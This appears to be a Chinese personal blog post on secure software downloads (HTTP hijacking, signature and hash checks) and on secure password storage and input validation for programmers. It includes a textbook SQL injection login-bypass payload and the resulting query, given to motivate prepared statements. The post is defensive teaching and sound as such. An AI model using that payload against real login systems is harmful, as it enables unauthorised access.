<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>土豆不好吃</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="土豆不好吃">
<meta property="og:url" content="http://example.com/page/13/index.html">
<meta property="og:site_name" content="土豆不好吃">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Benny小土豆">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">土豆不好吃</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-school-6/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/06/10/school-6/index/" class="article-date">
  <time class="dt-published" datetime="2017-06-10T00:00:00.000Z" itemprop="datePublished">2017-06-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>►<a class="article-category-link" href="/categories/security/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/06/10/school-6/index/">[学校上网系列]6.从下载软件中想到的：哎妈呀防不胜防啊</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_tips]站务通告：几天之前的6月3日，我发了一篇<a target="_blank" rel="noopener" href="https://dmesg.app/remember.html">很奇怪的博文</a>，之后关闭了首页，把页面改成了黑白。我的情绪并没有出现什么问题，我只是想用自己的方式去纪念不被承认的历史、去缅怀逝去的生命。希望能够有更多人去思考、了解、反思、奋斗。[&#x2F;v_tips]</p>
<p>在<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">本系列</a>开了九个月之后，我终于找到机会把这个坑填了，真是不容易啊，想要养肥再看的小伙伴们可以来看了。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/school-5.html">上一篇</a>中，咱讲了一些密码的问题，咱得说这一篇算得上是开博以来耗时最久、行文最长的博文了。好吧，作为结尾的博文，一定是有大大的坑的，再加上这话题也没啥可以说的，所以就当是我出来刷刷存在感好，别有啥期待！</p>
<h2 id="怎样安全的下载软件"><a href="#怎样安全的下载软件" class="headerlink" title="怎样安全的下载软件"></a>怎样安全的下载软件</h2><p>大多数Windows用户在想要使用某款软件的时候，可能会经历这样的步骤：打开百度啊什么的搜索引擎，搜索该软件的名称，从广告中找到真正的网站，再从广告中找到真正的下载链接，然后等待下载完成、双击安装或者是运行。</p>
<p>那么在这一个过程中 存在哪些安全问题呢？咱就不说下载到XXX下载器、戳到假的网站这种低级问题了。</p>
<p>通常来说，一般稍有安全意识的人都会意识到去官网下载软件，有些人可能还会知道校验数字签名、校验散列值，但是这些就一定天衣无缝了吗？当然不是了，<strong>防御需要天衣无缝</strong>，攻击只需要攻破一点。</p>
<h2 id="在官网下载就一定安全吗"><a href="#在官网下载就一定安全吗" class="headerlink" title="在官网下载就一定安全吗"></a>在官网下载就一定安全吗</h2><p>来说一说刚刚发生的事情吧！前天，我给室友下载Foxit阅读器的时候（很明显我是去官网下载的啦），顺手按了下Ctrl + J，发现下载链接竟然变成这个样子（为了防止个人信息泄漏，我把那个IP涂掉了）：</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_1.png"><img src="/images/061017_0014_1.png"></a></p>
<p>瞬间觉得有点不对劲。于是按F12打开开发者模式，重新刷新看看是怎么响应的，真是懒得抓包，哈哈：</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_2.png"><img src="/images/061017_0014_2.png"></a></p>
<p>很明显，当我在官网点击”下载”按钮时，我的浏览器所收到的请求中<strong>意外的</strong>包含了Headers，Headers的内容是<strong>302重定向到222这个IP</strong>，之后我的浏览器就去下载新的location中的文件了。</p>
<p>我可真是预言家。这不，<a target="_blank" rel="noopener" href="https://twitter.com/hackerfantastic/status/882203343287980032">vlc和几个信息安全研究者因为这事怼起来了</a></p>
<h3 id="那这个IP是个啥呢？"><a href="#那这个IP是个啥呢？" class="headerlink" title="那这个IP是个啥呢？"></a>那这个IP是个啥呢？</h3><p>据我推断，此IP应该是我学校（或者说是教育网吧）的一个缓存服务器，它把一部分资源缓存到自己的服务器上，这样我们访问速度就比较快，不用从原始链接下载了，有一点点像”透明代理”的味道。</p>
<h3 id="那么这样做有何问题呢？"><a href="#那么这样做有何问题呢？" class="headerlink" title="那么这样做有何问题呢？"></a>那么这样做有何问题呢？</h3><p>问题其实还是有一些的，假如有人黑了这台服务器（或者管理员想赚外快），把缓存的资源加上了后门木马或者是替换成其他的东西，那么透过这个缓存下载并使用的用户不就遭殃了吗？别忘了咱可是从官网下载的呀，但风险等级还是提高了啊。</p>
<p>几年前我有一次下载什么玩意，就被劫持成了瑞星的在线安装程序，幸亏我发现图标有点不对劲，右键看了下签名，哈哈哈。</p>
<h3 id="为啥原始地址的下载会被替换成这个链接呀？"><a href="#为啥原始地址的下载会被替换成这个链接呀？" class="headerlink" title="为啥原始地址的下载会被替换成这个链接呀？"></a>为啥原始地址的下载会被替换成这个链接呀？</h3><p>请大家戳一下上面的开发者工具的图，我们可以看到，Foxit返回给我们的是一个HTTP的响应，既然是HTTP的，那就是<strong>可以被劫持被篡改被阻断的</strong>，所以自然是被加了个<code>header location</code>到缓存服务器了。</p>
<h3 id="等等，foxit官网是https的呀？"><a href="#等等，foxit官网是https的呀？" class="headerlink" title="等等，foxit官网是https的呀？"></a>等等，foxit官网是https的呀？</h3><p>观察真仔细，没错，foxit官网是https的，但是给出的这个链接却是http的，这能有什么办法？假如某个软件的官网是http的，那更是网页都可能被劫持成<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/">人见人爱花见花开的某网站</a>。</p>
<h3 id="等等，我这个官网全都是https的，没有http"><a href="#等等，我这个官网全都是https的，没有http" class="headerlink" title="等等，我这个官网全都是https的，没有http"></a>等等，我这个官网全都是https的，没有http</h3><p>忘记了<a target="_blank" rel="noopener" href="http://www.sohu.com/a/59899735_257305">Linux Mint官网被黑</a>，<a target="_blank" rel="noopener" href="http://blog.linuxmint.com/?p=2994">ISO被加入后门</a>的事情了？还有……</p>
<h3 id="下载工具被投毒"><a href="#下载工具被投毒" class="headerlink" title="下载工具被投毒"></a>下载工具被投毒</h3><p>噢，大家搜索下”迅雷 投毒”就知道了，顺便看看<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2">xcodeGhost</a></p>
<p>所以，总结：在官网下载软件就一定安全吗？不一定，在官网不是https的情况下，<strong>你看到的官网未必是真正的官网，下载到的软件未必是原始的软件</strong>；在官网是https的情况下，也不排除出站链接为http、被黑、黑心下载工具搞了的情况。</p>
<h2 id="校验证书"><a href="#校验证书" class="headerlink" title="校验证书"></a>校验证书</h2><p>在windows中，一些比较知名的开发者（组织）开发的软件，都会给自己的程序加入一个数字证书，这样当软件被篡改的时候，操作系统就会给警告，比如说下面这个就是大名鼎鼎的小狐狸的证书，这就能说明这软件是<strong>纯正的、原汁原味的</strong>！</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_3.png"><img src="/images/061017_0014_3.png"></a></p>
<p>（图片盗自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/02/file-integrity-check.html">编程随想</a>）</p>
<p>数字证书的原理是啥呐？非常简单的理解，就是把RSA反过来用。反过来用是啥呢？咱正常用RSA，都是用公钥加密、私钥解密，反过来就是用私钥加密、公钥解密，这样乍一看虽说是失去了”加密”这一保密性需求，但是鉴于私钥只有开发者持有，这也就能够在某种程度上证明这是从开发者手中释出的软件。当然啦，现实生活中的数字签名还要涉及到散列函数、PKI等复杂的方法体系，咱这里就不说了。</p>
<p>可但是，但可是，校验数字签名就一定安全了吗？不一定。</p>
<h3 id="原因之一：有一些软件本身就不带有数字签名，这就没办法了；"><a href="#原因之一：有一些软件本身就不带有数字签名，这就没办法了；" class="headerlink" title="原因之一：有一些软件本身就不带有数字签名，这就没办法了；"></a>原因之一：有一些软件本身就不带有数字签名，这就没办法了；</h3><p>可能是因为开发者比较穷，实施比较麻烦，代码签名证书一般来说要一笔钱呢，这可和SSL证书不一样噢。</p>
<h3 id="原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。"><a href="#原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。" class="headerlink" title="原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。"></a>原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。</h3><p>此话怎讲？</p>
<p>大家可能用过一款由台湾人开发的非常有名的Windows下的编辑器：Notepad++，简直是神器啊，当初我看着那群人用着记事本写着Java而我享受着代码高亮和自动补全，哇塞！在今年3月维基解密爆光的<a target="_blank" rel="noopener" href="https://wikileaks.org/ciav7p1/">CIA Vault 7</a>中， Notepad++就中招了。是咋中招的呢？是这样的，Notepad++需要加载一个名为<code>scilexer.dll</code>的库文件，而Notepad++没有对这个dll进行校验，所以如果这个dll被替换成恶意的dll，那这不就完蛋了嘛。</p>
<p>大家想知道<a target="_blank" rel="noopener" href="https://notepad-plus-plus.org/news/notepad-7.3.3-fix-cia-hacking-issue.html">Notepad++官网是怎么说</a>的吗？感觉他们要被气炸了，官方能说出来f-word，真的是很气。</p>
<blockquote>
<p>Just like knowing the lock is useless for people who are willing to go into my house, I still shut the door and lock it every morning when I leave home. We are in a f**king corrupted world, unfortunately. 对在那些想进我房子的人来说，我家的锁显得毫无作用。虽然如此，但我每天早上离开家时，还是会锁上门。然不幸的是，我们生活在一个操蛋的堕落世界！</p>
</blockquote>
<h3 id="原因之三：你咋就那么相信你下载到的签名是正确的呢？"><a href="#原因之三：你咋就那么相信你下载到的签名是正确的呢？" class="headerlink" title="原因之三：你咋就那么相信你下载到的签名是正确的呢？"></a>原因之三：你咋就那么相信你下载到的签名是正确的呢？</h3><p>唉，其实还是第一个问题啊，假如你是从http网站上下载到的签名文件，那毫无疑问这个签名未必是原汁原味的……</p>
<h3 id="Android的apk签名"><a href="#Android的apk签名" class="headerlink" title="Android的apk签名"></a>Android的apk签名</h3><p>Android的apk也是带有签名的，签名的目的就是保证每个应用程序开发商合法ID，防止部分开放商可能通过使用相同的包名来混淆替换已经安装的程序。简单的说，就是你把某个APP改了改，自己签名，再安装，你若不卸载原来的APP，你是安装不上你自己的版本的（用幸运破解器等破解了签名保护机制的不算）</p>
<h3 id="Linux下校验签名"><a href="#Linux下校验签名" class="headerlink" title="Linux下校验签名"></a>Linux下校验签名</h3><p>Linux下也是可以校验签名的，比如我们经常会在某些软件下载链接旁边看到一个sig按钮，下载之后是一个asc文件，这个asc文件就是用来校验签名的。nautilus直接双击，当同名文件（不包括扩展名）存在时，就会自动校验，否则会弹窗让你选择目标文件进行校验，或者选择用<code>gpg2 –verify test.asc test.zip</code>也可以校验。</p>
<p>使用nautilus与gpg2校验数字签名成功与失败的截图（失败是我给压缩包中的一个readme略作修改啦）</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_5.png"><img src="/images/061017_0014_5.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_4.png"><img src="/images/061017_0014_4.png"></a></p>
<p>注意：咱可能得先用命令从<code>keyserver</code>导入公钥才可以，命令大致如下：</p>
<p>gpg2 –keyserver pool.sks-keyservers.net –search-keys AA65421D</p>
<p>其中 <code>pool.sks-keyservers.net</code>可替换成<code>pgp.mit.edu</code>等，<code>AA65421D</code>是ID</p>
<h2 id="校验散列值"><a href="#校验散列值" class="headerlink" title="校验散列值"></a>校验散列值</h2><p>在某些网站上 ，我们可能还会看到下载地址旁边给了个md5、sha1的散列值，这是方便我们校验的。假如我们的散列值和网站上给出的一样，那么这里的散列值就应该是完全一致的；如果不同，那么就意味着出问题啦。</p>
<p>那么这个过程中存在哪些漏洞呢？</p>
<h3 id="单项散列函数可被碰撞"><a href="#单项散列函数可被碰撞" class="headerlink" title="单项散列函数可被碰撞"></a>单项散列函数可被碰撞</h3><p>咱有人可能知道，几个月前的大新闻，<a target="_blank" rel="noopener" href="http://www.infoq.com/cn/news/2017/02/google-first-sha1-collision">Google成功碰撞SHA1</a>，再就之前md5的碰撞。呐，我猜你懂了吧。</p>
<h3 id="不安全呈现散列值的方法"><a href="#不安全呈现散列值的方法" class="headerlink" title="不安全呈现散列值的方法"></a>不安全呈现散列值的方法</h3><p>某些网站呐，它在下载页面显示的散列值（尽管它的下载链接可能是https的或者是其他的能够保证文件完整性的下载方式），但是它的那个页面是http的，那就是说这个页面可能被篡改，那这散列值还有啥用嘛……</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_6.png"><img src="/images/061017_0014_6.png"></a></p>
<p>（<a target="_blank" rel="noopener" href="http://msdn.itellyou.cn/">msdn我告诉你</a>中枪了。不过，咱可以去微软官网比对散列值，https的页面噢！）</p>
<p>上面说了这么多本来我们可能觉得天衣无缝的校验方式，其实都是存在<strong>一定程度</strong>的缺陷的。那可能有人想问了，这么罕见的、高级的攻击方式，可能不是经常存在的吧。没错，这种方式咱称之为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E9%95%BF%E6%9C%9F%E5%A8%81%E8%83%81">APT</a>（不是三磷酸腺苷，也不是Debian系的apt），遇到政府级别的攻击（由政府支持的攻击者，比如说NSA啦，嘿嘿嘿啦），那这是可能的。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_7.png"><img src="/images/061017_0014_7.png"></a></p>
<p>（图片来自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2017/05/my-blog-under-government-backed-attack.html">编程随想</a>）</p>
<h2 id="那么说了这么多，咱究竟该如何安全的下载软件啊？"><a href="#那么说了这么多，咱究竟该如何安全的下载软件啊？" class="headerlink" title="那么说了这么多，咱究竟该如何安全的下载软件啊？"></a>那么说了这么多，咱究竟该如何安全的下载软件啊？</h2><p>好吧，咱们都是一般人，那么<strong>时刻记得去官网下载、记得检查下载链接是否正常，尽可能的校验散列值、数字签名</strong>。尤其是对于（中国大陆）开发者来说，IDE什么的不去官网下载，不校验散列值和签名，那不就是在拿用户的隐私与安全开玩笑吗？<strong>不会翻墙，好意思说自己是程序员？</strong></p>
<p>啥？你想去某某管家什么的下载软件？求别逗啊，看我<a target="_blank" rel="noopener" href="http://www.huorong.cn/info/148826116759.html">藏恶意代码</a>，看我捆绑</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_8.png"><img src="/images/061017_0014_8.png"></a></p>
<p>（百度：我们已经收购腾讯 叫你不取消勾选，<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/24472672">图片来源知乎</a>）</p>
<h2 id="除了下载，更新也是个问题……"><a href="#除了下载，更新也是个问题……" class="headerlink" title="除了下载，更新也是个问题……"></a>除了下载，更新也是个问题……</h2><p>有很多软件啊，它更新的时候是通过http的，然后还不校验，那么就很容易被篡改。别说，真有个木马就是干这事了，比如说大名鼎鼎的<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2016/08/Trojan-Horse-DCM.html">黑暗幽灵木马</a>（据推测，这家伙也应该是政府背景）。什么你还不信？这几天大火的NotPetya不就是利用了M.E Doc 更新不带数字签名么！</p>
<h2 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h2><p>提到更新，我突然想起近期Apple全面封杀热更新，真的是可喜可贺的大好事啊！</p>
<h3 id="热更新是个啥"><a href="#热更新是个啥" class="headerlink" title="热更新是个啥"></a>热更新是个啥</h3><p>App由两种更新方式，一种是在App Store内进行更新，更新时重新下载全部安装包；另一种就是热更新，用户只有在打开App时才会发现热更新包，更新时只需下载安装更新部分的代码，再次打开时即可，这样可以直接绕过苹果App Store的审核。简单的讲就是绕过App store的审核，打开App才会进行”应用内更新”。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/2017061000590178.jpg"><img src="/images/2017061000590178-1024x576.jpg"></a></p>
<p>（阴阳师的热更新）</p>
<h3 id="这样有啥不好呢"><a href="#这样有啥不好呢" class="headerlink" title="这样有啥不好呢"></a>这样有啥不好呢</h3><p>咱举个例子，好好的一个应用，可以瞬间变成看小黄图的应用；好好的一个应用，可以瞬间加上后门监控用户隐私；更可怕的是，万一有黑客作祟呢？咱知道，写代码未必都有很强的安全意识啊。</p>
<p>现在，<strong>手机中包含的隐私已经超越了人们的想象</strong>，只要给我一个人的手机，那么我就可以了解他的一切。</p>
<p>从库克叫板FBI、要求App内必须使用https、再到封杀热更新，<strong>肆意扩张的权力，是对自由最大的威胁</strong>。</p>
<p>其实Google的Play Store<strong>也是禁止热更新</strong>的，没看支付宝啥的没少被下架嘛。（你敢相信，你平时用的好多应用根本没在Play Store上架？）可是大陆这种地方，三不管，毕竟Android和安卓是不一样的……（是，就连推送系统都要自己搞了？你这轮子是方的五边形的啊，反正不会是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8B%92%E6%B4%9B%E4%B8%89%E8%A7%92%E5%BD%A2">莱洛三角形</a>就对了）Google啊……Google啊，你咋就这么不管不顾我们这群处在<strong>水深火热</strong>的人呢啊，开始讨厌你了哦。</p>
<p><strong>对，我必须要黑阿里，支付宝隐私事件、抢月饼、截图中加数字盲水印还有一大堆放屁的话，阿里的节操在银河系外，我一天不黑阿里我就不舒服。</strong></p>
<p>说到这，似乎文章标题里的事情就说完了，似乎本文可以画上句号，但是……</p>
<h2 id="程序员们的安全素质"><a href="#程序员们的安全素质" class="headerlink" title="程序员们的安全素质"></a>程序员们的安全素质</h2><p>其实我不是一名合格的程序员，我写这一段只是为了装逼的，逃</p>
<h3 id="开发工具的获取"><a href="#开发工具的获取" class="headerlink" title="开发工具的获取"></a>开发工具的获取</h3><p>假如你是一名活在天朝的程序员，那么一定要记得<strong>去官网下载开发工具，然后校验证书或散列值</strong>。那个golang的开发者们……<strong>不会翻墙、不热爱翻墙、不想推墙，好意思说自己是搞IT的</strong>？反正我是不好意思。</p>
<h2 id="如何存储用户的密码"><a href="#如何存储用户的密码" class="headerlink" title="如何存储用户的密码"></a>如何存储用户的密码</h2><h3 id="明文存密码"><a href="#明文存密码" class="headerlink" title="明文存密码"></a>明文存密码</h3><p>在几年前，我做某个课程设计的时候，无数的人在实现登录的时候都将用户名和密码<strong>明文存入数据库中</strong>（包括我，我当时的安全意识很差）；咱学生，可能没太大安全意识，这一点可以理解，但是对于一个商业产品来说， 明文存密码？啥，不信，这就在我身边，看图。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/2011%E5%B9%B4%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6">还有CSDN呢</a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_9.png"><img src="/images/061017_0014_9.png"></a></p>
<p>（遇到一个明文存密码的家伙，你还想怎么办？）</p>
<p>假如你是一名学生，需要做个狗屎一样的课设，还恰巧需要有类似登录的功能，请一定要注意，<strong>千万不可以明文存密码</strong>。我猜可能有人会反驳，这就是个课设，为啥要这么注意？嗯，那是因为啊，咱程序员就是要从细节做起，千里之堤毁于蚁穴啊。</p>
<h3 id="自己实现加密（散列）算法"><a href="#自己实现加密（散列）算法" class="headerlink" title="自己实现加密（散列）算法"></a>自己实现加密（散列）算法</h3><p>哎唷我说，你真是把自己当成天才能干翻全世界的密码学家吗？你就是密码学博博博博博博士也不行啊。无论何时请一定要记得，<strong>别想着自己造加密算法，别想着算法保密就能够保证机密性，隐蔽式安全是不可取的</strong>。想想DVD的加密算法是怎么被破解的就知道了。</p>
<h3 id="hash一下存进去？"><a href="#hash一下存进去？" class="headerlink" title="hash一下存进去？"></a>hash一下存进去？</h3><p>稍微有点安全意识的程序员可能会将用户的密码hash一次，或者n次，或者自作聪明的<code>md5(sha1(&#39;test&#39;))</code>，然后放入数据库中，<strong>这都没啥太大的区别</strong>。很明显，散列一下要比明文存密码好一些，但是却依旧存在<strong>非常严重的安全隐患</strong>。为啥？哎呀，大部分散列函数算的都很快的，用户都是喜欢123456的，用户都是喜欢一个密码走天下的，彩虹表很方便的，撞库很容易的。</p>
<p>注意，之所以不推荐hash很多次以及混合hash，是因为密码学中有一个理论叫做”<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9F%AF%E5%85%8B%E9%9C%8D%E5%A4%AB%E5%8E%9F%E5%89%87">柯克霍夫原则</a>“，拿到了你数据库，也基本上意味着会拿到源代码。</p>
<h3 id="试试HMAC？"><a href="#试试HMAC？" class="headerlink" title="试试HMAC？"></a>试试HMAC？</h3><p>HMAC是个啥？其实挺复杂的，一句话可能说不完，但是简单说就是把AES和Hash结合起来，就是比如说用某个AES密钥加密了用户的密码，然后再hash一次再存入数据库中（当然这个说法太不准确了，实际上要比这复杂得多）。这样想要暴力破解是不太容易了，但是还是有问题呢，问题就是，假如某两个用户密码恰巧都是123456，那他们<strong>存的内容不就一样了吗</strong>？咱知道，用户都是喜欢123456的，黑客可以通过批量注册或者是根据算法批量生成大量弱口令的值，这样密码还是被破解出来啦。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_10.png"><img src="/images/061017_0014_10.png"></a></p>
<p>（HMAC在某个商业产品中的实现，从class文件反编译出来的。我受到了程序员的嘲讽）</p>
<p>我就知道你们还不信，那么请看图，此HMAC的散列值<code>37e0c8f50a64a454</code>对应的密码是<code>000000</code>，来看看多少用户的密码都是<code>000000</code>——2817人，此系统的总用户数接近3万。  <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/201706100135267.png"><img src="/images/201706100135267.png"></a></p>
<h3 id="加个随机盐？"><a href="#加个随机盐？" class="headerlink" title="加个随机盐？"></a>加个随机盐？</h3><p>加盐是个啥？咱知道，用户都是喜欢12345的，但是假如我们在密码中加入一段随机的盐值，比如说<code>ZVhWbENnPT0K</code>然后再hash一下存入数据库中，那么这密码强度不就显著提高了嘛~对噢，<strong>盐别短，别重复</strong>。</p>
<p>请注意，<code>test1</code>和<code>test2</code>的密码都是弱口令<code>123456</code>，但是咱可以看到这存的东西完全不同嘛。  <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_12.png"><img src="/images/061017_0014_12.png"></a></p>
<h3 id="随机盐就够了吗……？不够"><a href="#随机盐就够了吗……？不够" class="headerlink" title="随机盐就够了吗……？不够"></a>随机盐就够了吗……？不够</h3><p>实现随机盐就够了吗？当然那不够了。我们考虑下如下的用来判断密码的伪代码(这里的这俩字符串，是散列值哦，不应该是明文密码哦～)</p>
<p>if(‘123456’&#x3D;&#x3D;’111111’)<br>    do something;<br>else<br>    warning;</p>
<p>我们重点看那两个字符串（把&#x3D;&#x3D;写成&#x3D;的就不要说啦嘻嘻）。大部分语言是怎么比较这字符串的呢？它们会从第一位开始比较，发现都是1，那么好，继续比，第二位一个是2一个是1，那就是不等了，那就是false吧。这其中有啥问题呢？</p>
<p>咱说，这其中，”第一位就不同”与”第二位才不同”是<strong>存在运算的时间差</strong>的。假如平均比较一位需要10ns，那么要进行攻击，我们先猜测第一位是1，如果返回false时间基本上小于10ns，那么意味着我们<strong>第一位猜测是错误的</strong>；如果返回false时间明显长于10ns，那么意味着<strong>至少我们第一位的猜测是正确的</strong>；以此类推，我们可以通过这个微妙的时间差来一位一位的猜解密码。听着很不可思议、觉得很变态是不？这可是大名鼎鼎的”<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB">边信道攻击（旁路攻击）</a>“，更准确的说是时序攻击，<a target="_blank" rel="noopener" href="https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf">已经有人实现了</a></p>
<p>那这可咋办啊！麻蛋啊，变态啊，简直了啊。好办，管他啥样的，应用慢比较算法都给固定时间返回就可以了。</p>
<h3 id="再进一步……"><a href="#再进一步……" class="headerlink" title="再进一步……"></a>再进一步……</h3><p>咱知道大部分散列函数都很快，但是假如咱使用比较慢的散列函数呢？哎嘿嘿这是个好主意，比如说Dropbox用的bcrypt，嗯很好很棒。</p>
<h3 id="哎呀，你快说这些技术都咋实现吧，我不会写啊！"><a href="#哎呀，你快说这些技术都咋实现吧，我不会写啊！" class="headerlink" title="哎呀，你快说这些技术都咋实现吧，我不会写啊！"></a>哎呀，你快说这些技术都咋实现吧，我不会写啊！</h3><p><a target="_blank" rel="noopener" href="https://crackstation.net/hashing-security.htm">你戳我，这里有完整的介绍</a>……</p>
<p><a target="_blank" rel="noopener" href="https://github.com/defuse/password-hashing">你戳我，这里有源代码</a>……</p>
<p>PS，PHP7自带个<code>password_hash</code>，也很不错。但是好像很多人用Python啊，那咋办呢，没事，有一个很成熟的库叫做<a target="_blank" rel="noopener" href="https://passlib.readthedocs.io/en/stable/index.html">passlib</a>，很完美。其他语言欢迎补充。</p>
<p>噢对，对于web应用来说，要记得在服务端hash，要记得HTTPS，要记得防范XSS和注入，要记得有一个清晰的逻辑思维别注册的时候就告诉用户你这个密码和某某某用户重复了……</p>
<h2 id="如何验证输入：永远把你的用户当成坏人"><a href="#如何验证输入：永远把你的用户当成坏人" class="headerlink" title="如何验证输入：永远把你的用户当成坏人"></a>如何验证输入：永远把你的用户当成坏人</h2><p>也许产品经理会打死我？</p>
<p>好吧，假如我们设计一个登录界面，这样就需要构造一个SQL语句了，那么可能有些人是这样写的：</p>
<p>str&#x3D;”select * from admin where aUser&#x3D;’”+username+”‘“ and aPassword&#x3D;’”+password+”‘“;</p>
<p>其中<code>username</code>和<code>passowrd</code>的用户需要输入的内容（变量），假如我们在<code>username</code>中填入<code>&#39; or &#39;1&#39;=&#39;1&#39;--</code>，SQL查询语句会变成下面这个样子</p>
<p>select * from admin where aUser&#x3D;’’ or ‘1’&#x3D;’1’– and aPassword&#x3D;’’</p>
<p>实际上是这段（后面是注释）</p>
<p>select * from admin where aUser&#x3D;’’ or ‘1’&#x3D;’1’</p>
<p>这是一条<strong>恒等式</strong>，一定会查询出结果（结果集返回为真）并<strong>绕过验证</strong>。麻蛋，被注入了吧，还好是被注入了，不是被<code>drop table</code>了。要是jdbc这还好，毕竟分号没用……</p>
<p>那咋办呢？笨办法，把用户输入的<code>or, –,&#39;;</code>等关键字和特殊字符都过滤了，大不了抛出异常而已呗……或者用语言内建的安全机制（比如说JDBC的<code>PreparedStatement</code>就可以很大程度的防止SQL注入）</p>
<p>PS，在Web开发中，对于用户提交的表单也要过滤啊，要不被XSS的就不好玩了啊哈哈！（微信又中枪了）</p>
<h2 id="客户端哈希还是服务端哈希"><a href="#客户端哈希还是服务端哈希" class="headerlink" title="客户端哈希还是服务端哈希"></a>客户端哈希还是服务端哈希</h2><p>今晚（8月12日）看到一篇很搞笑的文章，就是说一个明文登录被ISP搞了。部分摘录如下：<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/201708121348194.jpg"><img src="/images/201708121348194-300x178.jpg"></a></p>
<p>这个程序员可以炒了，链接<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/896355175472013313">戳我</a></p>
<p>无论何时，一定要记得<strong>凡是涉及到登录的界面就要使用HTTPS</strong>，甚至毫不过分的说应该全站HTTPS。因为如果不是全站HTTPS，有些情况下登录那个按钮的A标签就是可以被篡改进而钓鱼或者降级的。</p>
<p>除了登录，也应该<strong>至少</strong>使用服务器哈希。也就是说服务端哈希、服务端+客户端哈希都是可以的，但是<strong>只有客户端哈希是不可以的</strong>，因为这样就会造成重放攻击。更详细的说，就是这样的：</p>
<h3 id="只使用客户端哈希，非SSL"><a href="#只使用客户端哈希，非SSL" class="headerlink" title="只使用客户端哈希，非SSL"></a>只使用客户端哈希，非SSL</h3><p>那么骇客就可以直接截获到这个哈希，那么他只要把这个哈希值发送给服务器，他就能够被授权登录，可实际上他并不知道用户的密码，这就是所谓的重放攻击；</p>
